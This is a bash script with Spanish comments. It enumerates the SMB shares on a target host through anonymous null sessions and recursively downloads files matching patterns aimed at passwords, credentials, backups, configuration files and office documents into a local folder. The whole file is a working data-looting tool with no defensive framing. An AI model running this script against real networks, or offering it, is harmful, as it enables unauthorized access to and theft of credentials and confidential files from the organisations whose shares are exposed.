#!/bin/bash
# Busca y descarga archivos interesantes de shares SMB

target=$1
download_dir="/tmp/smb_downloads_$(date +%s)"
interesting_files=("*.txt" "*.doc" "*.docx" "*.xls" "*.xlsx" "*.pdf" "*.config" "*.ini" "*.conf" "backup*" "*pass*" "*cred*")

mkdir -p "$download_dir"

echo "[+] Buscando archivos interesantes en shares SMB de $target"

# Primero encuentra shares
shares=$(smbclient -L //$target -N 2>/dev/null | grep -E '^[[:space:]]+[A-Za-z0-9_]+' | awk '{print $1}')

for share in $shares; do
    if [ "$share" != "IPC$" ] && [ "$share" != "print$" ]; then
        echo "[*] Explorando share: $share"
        share_dir="$download_dir/$share"
        mkdir -p "$share_dir"
        
        # Usa smbclient para buscar y descargar
        for pattern in "${interesting_files[@]}"; do
            echo "  Buscando: $pattern"
            
            # Crea script para smbclient
            cat > /tmp/smb_commands.txt << EOF
recurse
prompt off
mget $pattern
quit
EOF
            
            # Ejecuta búsqueda
            smbclient -N //$target/$share -c "lcd $share_dir" < /tmp/smb_commands.txt 2>/dev/null
        done
        
        # Cuenta archivos descargados
        file_count=$(find "$share_dir" -type f 2>/dev/null | wc -l)
        echo "  [*] Descargados $file_count archivos de $share"
    fi
done

echo "[+] Descarga completada en: $download_dir"
echo "[+] Archivos encontrados:"
find "$download_dir" -type f 2>/dev/null | head -20
